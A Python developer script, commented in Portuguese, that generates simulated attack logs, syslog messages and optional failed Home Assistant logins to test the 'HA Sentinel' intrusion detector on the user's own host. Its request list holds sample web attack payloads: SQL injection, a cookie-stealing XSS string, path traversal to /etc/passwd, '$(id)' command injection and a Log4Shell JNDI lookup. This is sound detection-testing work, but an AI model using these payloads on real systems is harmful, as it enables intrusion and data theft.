#!/usr/bin/env python3
"""Gera tráfego de ataque simulado para a SUA instância de testes do HA Sentinel.

É uma ferramenta de desenvolvimento/validação: use-a apenas contra um host de
testes que seja seu. Ela:
  * grava linhas de log de exemplo em ./dev/logs (lidas pelo HA Sentinel);
  * envia mensagens syslog UDP para o host de testes informado;
  * opcionalmente faz logins inválidos no Home Assistant do host de testes.

O host de testes (IP ou DNS) é perguntado ao iniciar, a menos que seja passado
por --host. Exemplos:
    python3 scripts/simulate_attacks.py
    python3 scripts/simulate_attacks.py --host 192.168.1.50 --loop 10
    python3 scripts/simulate_attacks.py --host meuhost.ddns.net --ha-login
"""

from __future__ import annotations

import argparse
from datetime import datetime
import ipaddress
import json
from pathlib import Path
import random
import re
import socket
import sys
import time
import urllib.error
from urllib.parse import urlsplit, urlunsplit
import urllib.request

# Rótulos DNS: letras, dígitos e hífen (não no início/fim), 1–63 caracteres cada.
_DNS_LABEL = re.compile(r"^(?!-)[A-Za-z0-9-]{1,63}(?<!-)$")

ROOT = Path(__file__).resolve().parent.parent
LOG_DIR = ROOT / "dev" / "logs"

# Faixas de documentação (RFC 5737): nunca são hosts reais.
ATTACKERS = [f"{net}.{i}" for net in ("192.0.2", "198.51.100", "203.0.113") for i in (7, 23, 42, 99)]

WEB_REQUESTS = [
    ("GET", "/.env", "Mozilla/5.0 zgrab/0.x"),
    ("GET", "/wp-login.php", "Mozilla/5.0"),
    ("GET", "/index.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users", "sqlmap/1.8"),
    ("GET", "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", "Mozilla/5.0"),
    ("GET", "/static/..%2f..%2f..%2fetc/passwd", "curl/8.4.0"),
    ("GET", "/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id)", "Mozilla/5.0"),
    ("GET", "/", "${jndi:ldap://203.0.113.66/a}"),
    ("GET", "/phpmyadmin/index.php", "Mozilla/5.0 (compatible; Nuclei)"),
    ("POST", "/xmlrpc.php", "Mozilla/5.0"),
    ("GET", "/api/states", "python-requests/2.31"),  # benigno: NÃO deve ser sinalizado
]
USERS = ["root", "admin", "pi", "ubuntu", "homeassistant", "test", "oracle"]


def _ts_syslog() -> str:
    return datetime.now().strftime("%b %d %H:%M:%S")


def _ts_clf() -> str:
    return datetime.now().astimezone().strftime("%d/%b/%Y:%H:%M:%S %z")


def ssh_lines(n: int) -> list[str]:
    ip = random.choice(ATTACKERS)
    out = []
    for _ in range(n):
        user = random.choice(USERS)
        port = random.randint(30000, 65000)
        out.append(
            f"{_ts_syslog()} gateway sshd[{random.randint(100, 9999)}]: "
            f"Failed password for {user} from {ip} port {port} ssh2"
        )
    return out


def web_lines(n: int) -> list[str]:
    out = []
    for _ in range(n):
        method, path, ua = random.choice(WEB_REQUESTS)
        ip = random.choice(ATTACKERS)
        out.append(f'{ip} - - [{_ts_clf()}] "{method} {path} HTTP/1.1" 404 153 "-" "{ua}"')
    return out


def firewall_lines(n: int) -> list[str]:
    ip = random.choice(ATTACKERS)
    ports = random.sample(
        [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 1433, 3306, 3389, 5900, 8080, 8443], k=min(n, 16)
    )
    return [
        f"{_ts_syslog()} gateway kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:00 SRC={ip} DST=192.168.1.10 "
        f"LEN=44 TOS=0x00 PROTO=TCP SPT={random.randint(1024, 65535)} DPT={port} WINDOW=1024 SYN URGP=0"
        for port in ports
    ]


def append(name: str, lines: list[str]) -> None:
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    with (LOG_DIR / name).open("a", encoding="utf-8") as fh:
        fh.write("\n".join(lines) + "\n")
    print(f"  + {len(lines):3d} linhas em dev/logs/{name}")


def send_syslog(host: str, port: int, lines: list[str]) -> None:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            for line in lines:
                sock.sendto(f"<38>{line}".encode(), (host, port))
    except OSError as err:
        print(f"  ! syslog falhou para {host}:{port}/udp: {err}")
        return
    print(f"  + {len(lines):3d} mensagens syslog para {host}:{port}/udp")


def ha_failed_logins(base_url: str, attempts: int) -> None:
    """Inicia um fluxo de login no SEU Home Assistant e envia senhas erradas."""
    base = base_url.rstrip("/")
    for _ in range(attempts):
        try:
            req = urllib.request.Request(
                f"{base}/auth/login_flow",
                data=json.dumps(
                    {"client_id": f"{base}/", "handler": ["homeassistant", None], "redirect_uri": f"{base}/"}
                ).encode(),
                headers={"Content-Type": "application/json"},
            )
            flow = json.load(urllib.request.urlopen(req, timeout=5))
            req = urllib.request.Request(
                f"{base}/auth/login_flow/{flow['flow_id']}",
                data=json.dumps(
                    {"username": random.choice(USERS), "password": "senha-invalida", "client_id": f"{base}/"}
                ).encode(),
                headers={"Content-Type": "application/json"},
            )
            urllib.request.urlopen(req, timeout=5).read()
        except (urllib.error.URLError, KeyError, ValueError, TimeoutError) as err:
            print(f"  ! login falhou: {err}")
            return
    print(f"  + {attempts:3d} logins inválidos em {base}")


def normalize_host(raw: str) -> str:
    """Aceita um IP, um nome DNS ou uma URL e retorna apenas o host (sem esquema/porta)."""
    value = raw.strip()
    if not value:
        raise ValueError("host vazio")
    if "://" in value:
        value = urlsplit(value).hostname or ""
    value = value.strip("[]").split("/", 1)[0]
    if ":" in value and value.count(":") == 1:  # host:porta
        value = value.split(":", 1)[0]
    if not value:
        raise ValueError("host inválido")
    # Valida: ou é um IP, ou um nome de host plausível.
    try:
        ipaddress.ip_address(value)
    except ValueError:
        labels = value.split(".")
        if len(value) > 253 or not all(_DNS_LABEL.match(label) for label in labels):
            raise ValueError(f"host inválido: {raw!r}") from None
    return value


def build_ha_url(host: str, scheme: str, port: int | None) -> str:
    netloc = host if port is None else f"{host}:{port}"
    return urlunsplit((scheme, netloc, "", "", ""))


def prompt_host() -> str:
    """Pergunta interativamente o IP ou DNS do host de testes."""
    if not sys.stdin.isatty():
        raise SystemExit("Sem host: use --host IP_OU_DNS (entrada não interativa).")
    while True:
        try:
            raw = input("IP ou DNS do host de testes (ex.: 192.168.1.50 ou meuhost.ddns.net): ")
        except (EOFError, KeyboardInterrupt):
            raise SystemExit("\nCancelado.") from None
        try:
            return normalize_host(raw)
        except ValueError as err:
            print(f"  ! {err}. Tente novamente.")


def burst(args: argparse.Namespace, host: str) -> None:
    print(time.strftime("%H:%M:%S"), f"rajada de ataques simulados → {host}")
    append("auth.log", ssh_lines(random.randint(3, 8)))
    append("access.log", web_lines(random.randint(4, 10)))
    append("ufw.log", firewall_lines(random.randint(4, 14)))
    if not args.no_syslog:
        send_syslog(host, args.syslog_port, ssh_lines(3) + firewall_lines(5))
    if args.ha_login:
        ha_failed_logins(build_ha_url(host, args.ha_scheme, args.ha_port), args.ha_attempts)


def main() -> None:
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("--host", help="IP ou DNS do host de testes (se omitido, é perguntado)")
    parser.add_argument("--loop", type=float, default=0, help="repete a cada N segundos (0 = uma vez)")
    parser.add_argument("--syslog-port", type=int, default=5514, help="porta UDP do receptor syslog")
    parser.add_argument("--no-syslog", action="store_true", help="não enviar syslog")
    parser.add_argument(
        "--ha-login",
        action="store_true",
        help="também fazer logins inválidos no Home Assistant do host",
    )
    parser.add_argument("--ha-scheme", choices=("http", "https"), default="http")
    parser.add_argument("--ha-port", type=int, default=8123, help="porta do Home Assistant (padrão 8123)")
    parser.add_argument("--ha-attempts", type=int, default=3)
    parser.add_argument("--yes", "-y", action="store_true", help="não pedir confirmação do host informado")
    args = parser.parse_args()

    host = normalize_host(args.host) if args.host else prompt_host()

    if not args.yes:
        confirm = (
            input(f"Confirmar host de testes {host!r}? [s/N]: ").strip().lower()
            if sys.stdin.isatty()
            else "s"
        )
        if confirm not in ("s", "sim", "y", "yes"):
            raise SystemExit("Cancelado.")

    burst(args, host)
    while args.loop > 0:
        time.sleep(args.loop)
        burst(args, host)


if __name__ == "__main__":
    main()
